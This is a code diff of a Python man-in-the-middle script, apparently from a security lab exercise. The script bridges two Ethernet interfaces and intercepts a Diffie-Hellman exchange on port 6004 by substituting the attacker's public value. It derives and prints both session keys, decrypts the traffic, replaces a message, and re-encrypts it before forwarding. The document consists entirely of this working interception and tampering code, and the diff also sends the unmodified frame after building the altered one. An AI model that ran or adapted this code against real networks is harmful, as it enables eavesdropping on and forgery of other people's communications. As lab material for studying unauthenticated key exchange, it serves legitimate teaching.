@@ -25,8 +25,8 @@ listenPort = 6004
 
 interfaces = {"eth0", "eth1"}
 
-THE_GOOD_MESSAGE = b"I love you!"
-MY_EVIL_MESSAGE = b"I hate you :P"
+THE_GOOD_MESSAGE = "I love you!"
+MY_EVIL_MESSAGE = "I hate you :P"
 
 
 def generate_random(N, bits=1536):
@@ -54,6 +54,7 @@ Bob_key = bytes()
 
 def create_key(Num:int):
     dh = pow(Num, e, p)
+    print(dh)
     return hashlib.sha256(bytes.fromhex(hex(dh)[2:])).digest()
 
 def send_datagram(raw_packet, interface):
@@ -61,14 +62,16 @@ def send_datagram(raw_packet, interface):
         s.bind((interface, 0))
         s.sendall(raw_packet)
     except OSError as e:
-        print(f"Something went wrong in transmission: {e}")
+        print(f"Something went wrong in transmission: {e}, len:{len(raw_packet)}")
 
-def handle_spoofed_data(data: bytes) -> bytes:
+def handle_spoofed_data(data: str) -> str:
+    
     try:
-        as_string = str(data)
-        print(f"Eevesdropped:{as_string}")
-        if as_string == THE_GOOD_MESSAGE:
-            data = bytes(MY_EVIL_MESSAGE)
+
+        print(f"Eevesdropped:{data}")
+        if str(THE_GOOD_MESSAGE) in data:
+            data = str(MY_EVIL_MESSAGE)
+        
     finally:
         return data
 
@@ -115,68 +118,74 @@ def process_datagram(raw_packet, fromIf):
     eth = dpkt.ethernet.Ethernet(raw_packet)
     toIf = "eth1" if fromIf == "eth0" else "eth0" # Switch the interface to be able to propagate the message.
 
-    # Ignore ARP and ICMP
-    if not isinstance(eth.data, dpkt.ip.IP) or not isinstance(eth.data, dpkt.ip6.IP6):
-        subprocess.run(["LED", "R", "FAST"])
-
-
-        print("not ipv4 or ipv6:", hex(eth.type))
+    # Ignore ARP
+    if not isinstance(eth.data, (dpkt.ip.IP, dpkt.ip6.IP6)):
+        type = eth.type
+        if type >= 0x6000 and type not in [0x0806, 0x88cc]: # ARP, LLDP
+            print("not ipv4 or ipv6:", hex(eth.type))
         send_datagram(eth.__bytes__(), toIf)
         return
     ip = eth.data
 
     # Ignore UDP
     if not isinstance(ip.data, dpkt.tcp.TCP):
-        subprocess.run(["LED", "R", "FAST"])
-        print("UDP")
+        protocol = dpkt.ip.get_ip_proto_name(ip.p)
+        if protocol not in ["UDP", "ICMP", "ICMP6", "IGMP"]:
+            print("Received proctocol:", protocol)
         send_datagram(eth.__bytes__(), toIf)
         return
     tcp = ip.data
 
-    #Ignore Irrelevant communications
+    #Ignore Irrelevant communications, either of them has to be == listenPort
     if tcp.sport != listenPort and tcp.dport != listenPort:
-        subprocess.run(["LED", "R", "FAST"])
-        print("Wrong port")
+        if(tcp.sport not in [22, 443] and tcp.dport not in [22, 443]):
+            print(f"Wrong port (src:{tcp.sport}, dst:{tcp.dport})" )
         send_datagram(eth.__bytes__(), toIf)
         return
     
     # Ignore Handshake
-    #if is_handshake(tcp):
-    #    subprocess.run(["LED", "B", "FAST"])
-    #    print("Handshake!")
-    #    send_datagram(eth.__bytes__(), toIf)
-    #    return
-    
-    data = bytes(tcp.data)
-    if len(data) == 0:
+    if is_handshake(tcp):
         subprocess.run(["LED", "B", "FAST"])
         print("Handshake!")
         send_datagram(eth.__bytes__(), toIf)
         return
     
+    data = bytes(tcp.data)
+    #if len(data) == 0:
+    #    subprocess.run(["LED", "B", "FAST"])
+    #    print("Handshake!")
+    #    send_datagram(eth.__bytes__(), toIf)
+    #    return
+    
+    
     if Alice == 0:
         Alice_IP = inet_to_str(ip.src)
         Bob_IP = inet_to_str(ip.dst)
         #Diffie Hellman num is transmitted as a hex-str
-        Alice = int(data.hex(), 16)
+        Alice = int(data.decode(), 16)
+        
         Alice_key = create_key(Alice)
 
         print("It's hacking time!")
+        print("Alice's key is:", Alice_key.hex())
 
         data_bob = format(Eve, "x").encode("utf-8")
-        print(f"Sending {len(data_bob)} bytes to bob")
+        
+        
         eth2 = swapTCPPayloadInEthernetFrame(eth, data_bob)
         send_datagram(eth2.__bytes__(), toIf)
+        
         subprocess.run(["LED", "W", "SOLID"])
         return
     elif Bob == 0 and Bob_IP == inet_to_str(ip.src):
         Bob_IP = inet_to_str(ip.src)
 
         #Diffie Hellman num is transmitted as a hex-str
-        Bob = int(data.hex(), 16)
+        Bob = int(data.decode(), 16)
         Bob_key = create_key(Bob)
 
         print("Let's attack alice this time.")
+        print("Bob's key is:", Bob_key.hex())
 
         data_alice = format(Eve, "x").encode()
         eth2 = swapTCPPayloadInEthernetFrame(eth, data_alice)
@@ -184,7 +193,7 @@ def process_datagram(raw_packet, fromIf):
         subprocess.run(["LED", "Y", "SOLID"])
         return
     
-    elif Alice != 0 and Bob != 0:
+    elif Alice != 0 and Bob != 0 and len(data) > 0:
         sender = inet_to_str(ip.src)
         receiver = inet_to_str(ip.dst)
 
@@ -196,9 +205,9 @@ def process_datagram(raw_packet, fromIf):
         else:
             print("Bob is such a fool.")
 
-        data = decrypt(data, decrypt_key)
-        data = handle_spoofed_data(data)
-        reencrypted = encrypt(data, encrypt_key)
+        plaintext = decrypt(data, decrypt_key).decode()
+        data = handle_spoofed_data(plaintext)
+        reencrypted = encrypt(data.encode(), encrypt_key)
 
         eth2 = swapTCPPayloadInEthernetFrame(eth, reencrypted)
         send_datagram(eth.__bytes__(), toIf)
@@ -215,7 +224,7 @@ if __name__ == "__main__":
     try:
         while True:
             subprocess.run(["LED", 'OFF'])
-            raw_data, addr = s.recvfrom(dpkt.ethernet.ETH_LEN_MAX)
+            raw_data, addr = s.recvfrom(dpkt.ethernet.ETH_LEN_MAX-4)
 
             interface = addr[0]
             if (interface == "eth0" or interface=="eth1"): 
